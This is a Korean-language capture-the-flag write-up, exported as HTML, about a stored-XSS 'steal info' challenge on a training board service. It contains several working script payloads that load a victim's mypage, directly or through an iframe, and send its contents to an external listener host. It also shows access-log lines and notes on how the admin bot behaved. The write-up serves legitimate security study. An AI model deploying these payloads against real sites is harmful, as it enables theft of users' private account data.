+</p></div></li></ul></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-806e-a62f-ecd28cac533e" class="bulleted-list"><li style="list-style-type:disc">클라이언트 스크립트 스틸인포2 문제<div style="display:contents" dir="auto"><p id="2d862085-e5ae-80b4-bcf4-c2d654055720" class="">게시판을 사용하는 것은 동일함.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80fa-a58f-e6b9f1921f23" class="">타겟페이지는 게시판서비스의 마이페이지(<code>/scriptPrac2/mypage.php</code>)이고</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8038-b25b-c3dda61f6cae" class="">수업에서 쌤이 알려준 것 처럼 iframe 만들어서 뒤져보는 것이 귀찮아서 fetch 함수를 사용해 마이페이지 주소를 요청한 뒤 응답결과 html 텍스트 전체를 외부서버에 post 방식으로 전송하고, 서버는 tmp 폴더에 저장하도록 시도해봄.</p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-80b7-b982-cc8339af9b86" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%206.png"><img style="width:681.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%206.png"/></a></figure></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-80dc-9454-fab3cddd49a0" class="toggle"><li><details open=""><summary>코드로 보기</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-8033-bd0f-e577c813dbde" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;
+  fetch(
+    &#x27;/scriptPrac/mypage.php?user=admin&#x27;,
+    {
+      headers:{
+        &#x27;Cookie&#x27;:document.cookie
+      }
+    }
+  ).then(
+    res=&gt;res.text().then(
+      txt=&gt;{
+        const data=new FormData();
+        data.set(&#x27;d&#x27;,txt);
+        fetch(
+          &#x27;https://segfault.dnode.link/steal_info_listener.php&#x27;,
+          {
+            method:&#x27;POST&#x27;,
+            body:data
+          }
+        )
+      }
+    )
+  )
+&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-807d-bd95-c584c82e6c6c" class="">ctf 게시판 서비스에 실제 계정으로 로그인해서 위와 같이 스크립트를 삽입한 게시글 작성 후, 노트북 브라우저에서 방문 했을 경우에는, 로그인한 계정의 mypage 페이지 소스가 정상적으로 저장되었음.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8063-916d-f10cae28f6d1" class="">하지만 관리자 봇에게 해당 게시글 방문시켰을때는, 로그인하지 않은 상태로 mypage.php 를 방문했을때 처럼 “잘못된 접근입니다” alert 뜨고, id, info 관련 input 태그에 placeholder 값이 채워지지 않은 문서가 저장되는 것을 확인했음.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80a2-b59d-c112d09b5749" class="">스틸인포1 문제에서는 같은 방식으로 fetch 함수를 사용해서 타겟페이지 문서를 관리자 봇의 브라우저에서 요청하도록 하고 데이터를 잘 찾을 수 있었는데, 여기서는 왜 안되는지 이유를 찾아보려 몇가지 실험을 조금 해봤지만…</p></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-8080-ab81-ee638f877cf7" class="toggle"><li><details open=""><summary>체크해본 내용</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-80ce-a39c-c97e69a2057f" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">121.100.60.200 - - [26/Dec/2025:06:14:49 +0000] 
+&quot;POST /steal_info_listener.php HTTP/1.1&quot; 200 4339 
+&quot;http://ctf.segfaulthub.com:4343/&quot; 
+&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
+	AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;
+
+[관리자 봇 ip 있었음] - - [26/Dec/2025:06:15:27 +0000] 
+&quot;POST /steal_info_listener.php HTTP/1.1&quot; 200 4464 
+&quot;http://ctf.segfaulthub.com:4343/&quot; 
+&quot;Mozilla/5.0 (X11; Linux x86_64) 
+  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36&quot;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-803c-b216-da062302f49f" class="">로컬에서 보낸 요청과 원격 관리자 봇에서 보낸 요청 로그 비교. 크롬 버전이 60 대 인것? 리눅스 사용중인 것? 정도 확인할 수 있어보임. 60대 버전은 찾아보니 대략 2017년쯤 사용하던 버전이라고 함</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80cf-ab37-e807304b6330" class="">
+</p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-80cf-b030-c7efac5b9ea7" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%207.png"><img style="width:654px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%207.png"/></a></figure></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-807d-a4e6-dacbc6107d8b" class="toggle"><li><details open=""><summary>코드로 보기</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-8003-89a3-e6d21d22f257" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;iframe src=&quot;/scriptPrac2/mypage.php&quot; id=&quot;target&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  let time=0;
+  const i=setInterval(
+    ()=&gt;{
+      const t=document.getElementById(&#x27;target&#x27;);
+      navigator.sendBeacon(&#x27;https://segfault.dnode.link/&#x27;+time,time);
+      time++
+    },
+    300
+  );
+  fetch(&#x27;http://localhost&#x27;).then(
+    res=&gt;res.text().then(
+      console.log
+    )
+  )
+&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8096-ae3c-f6710ef383de" class="">0.3초마다 서버로 요청을 보내도록 해보니 관리자 봇은 대략 3초정도 기다렸다가 페이지를 종료하는 것 같아보였음.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8069-b957-cc2f4c627661" class="">그 아래 로컬호스트 호출은 뭔가 다른 시스템 정보 살펴볼 방법 없을까 생각하면서 적어본 것들… 관리자 봇 머신에 아파치가 돌고 있어도 CORS 때문에 호출 안될 것 같음</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8009-9e3f-d545055afc0c" class="">
+</p></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8002-9274-caddfbdee9be" class="">
+</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-809b-9840-e92f4717df8e" class="">결국 iframe 생성해서 데이터 받아오는 방식으로 풀었음.</p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-802d-bb70-ec2ec06d34e9" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%208.png"><img style="width:682px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%208.png"/></a></figure></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-80a0-9487-d3e500c8fb72" class="toggle"><li><details open=""><summary>코드로 보기</summary><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-80d9-ac7c-e18e669f021a" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;iframe src=&quot;/scriptPrac2/mypage.php&quot; id=&quot;target&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  const i=setInterval(
+    ()=&gt;{
+      const t=document.getElementById(&#x27;target&#x27;);
+      fetch(&#x27;https://segfault.dnode.link/&#x27;+t.contentDocument.getElementsByName(&#x27;info&#x27;)[0].getAttribute(&#x27;placeholder&#x27;));
+      clearInterval(i)
+    },
+    100
+  )
+&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8077-abb3-f085526e19ce" class="">로컬에서 테스트해봤을때</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-802c-aae7-d03dc4fa6291" class="">iframe 생성 후 페이지가 로드된 뒤에 스크립트가 실행되기도 하고, 어쩔때는 iframe 에 페이지가 다 불러지지 않아서 contentDocument 값이 없는 경우가 왔다갔다 했음. 그래서 setInterval 함수를 사용해 페이지 로딩 된 뒤 적당한 시간 후에 데이터 추출 및 전송하는 코드 실행되도록 함.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8068-ac8c-de439719899a" class="">흥미로웠던 부분은 getElementsByName 으로 원하는 인풋태그 선택해서 placeholder 속성값을 가져올때 </p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8022-92cd-eef81b21aa71" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"><img style="width:681.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8002-81b2-e6509e29ce1f" class="">id, info, pw 값을 선택하면 로컬에서는 모두 잘 가져올 수 있음.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-802f-94a0-c158f5fd4d4b" class="">근데 관리자 원격 봇은 info, pw 값은 가져올 수 있는데 id 값을 가져오려고 하면 안됨. iframe 문서 안에 있는 전체 문서를 추출해서 보고싶긴 한데 거기까지는 아직 못해봄.</p></div></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-804e-a4af-cf7f62725d5b" class="">
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
